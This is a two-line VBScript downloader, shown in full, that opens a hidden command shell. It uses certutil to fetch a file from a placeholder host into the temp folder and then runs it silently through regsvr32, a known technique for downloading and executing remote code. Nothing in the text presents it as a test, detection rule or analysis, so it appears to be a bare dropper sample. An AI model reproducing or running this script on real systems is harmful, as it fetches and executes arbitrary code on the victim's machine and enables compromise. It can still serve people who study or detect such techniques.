Set s=CreateObject("WScript.Shell")
s.Run "cmd /c certutil -urlcache -split -f https://example.invalid/object.txt %temp%\object.txt && regsvr32.exe /s %temp%\object.txt",0,True
